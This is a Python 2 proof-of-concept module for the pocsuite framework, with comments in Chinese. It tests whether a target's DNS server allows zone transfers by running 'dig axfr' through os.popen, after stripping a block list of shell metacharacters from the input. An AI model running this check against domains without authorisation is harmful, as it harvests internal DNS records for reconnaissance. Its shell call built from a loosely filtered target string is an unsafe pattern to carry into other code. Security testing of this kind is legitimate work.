#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
#requests 
from pocsuite.api.request import req
#register
from pocsuite.api.poc import register
#report
from pocsuite.api.poc import Output, POCBase
#url转换host
from pocsuite.lib.utils.funs import url2ip

#基础基类
class DNSPOC(POCBase):
    vulID = '44'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2018-08-03' #漏洞公开的时间,不知道就写今天

    author = 'colorway' #  PoC作者的大名
    createDate = '2018-08-03'# 编写 PoC 的日期
    updateDate = '2018-08-03'# PoC 更新的时间,默认和编写时间一样
    references=""
    name = 'Domain transfer '# PoC 名称
    appPowerLink = ''# 漏洞厂商主页地址
    appName = 'DNS'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'info-disclosure'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        DNS 域传送漏洞
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危" #严重,高危,中危,低危

    #指纹方法
    def _fingerprint(self):
        pass
    
    def _verify(self):
        import os, re
        result={}
        vul_url = '%s' % self.url
        block_str = ['#', '&', ';', '`', '|', '*', '~', '<', '>', '^', '(', ')', '[', ']', '{', '}', '$', '\\', '\'', '\"', '%']
        for str in block_str:
            vul_url = vul_url.replace(str, "")
        print '[+] Nslookup %s' % vul_url
        try:
            # cmd_res = os.popen('nslookup -type=ns ' + vul_url).read()  # fetch DNS Server List
            # print cmd_res
            # dns_servers = re.findall('nameserver = ([\w\.]+)', cmd_res)
            # print dns_servers
            # if len(dns_servers) == 0:
            #     print '[+] No DNS Server Found!'
            # else:
            #     for singledns in dns_servers:
            #         print '[+] Using @%s' % singledns
            #         cmd_res = os.popen('dig @%s axfr %s' % (singledns, vul_url)).read()
            #         print cmd_res
            #         if cmd_res.find('XFR size') > 0:
            #             print '[+] Vulnerable dns server found:', singledns
            #             print cmd_res
            #             result['VerifyInfo'] = {}
            #             result['VerifyInfo']['URL'] = vul_url
            #             result['VerifyInfo']['Payload'] = vul_url
            #         else:
            #             print '[+] No Vulnerable found'
            cmd_res = os.popen('dig axfr %s' % vul_url).read()
            print cmd_res
            if cmd_res.find('XFR size') > 0:
                print '[+] Vulnerable dns server found:'
                print cmd_res
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_url
                result['VerifyInfo']['Payload'] = vul_url
            else:
                print '[+] No Vulnerable found'
        except Exception as e:
            print e
            pass
        print '[+]44 poc done'
        return self.save_output(result)

    #攻击模块
    def _attack(self):
        result = {}
        return self._verify()


    #输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


#注册类
register(DNSPOC)

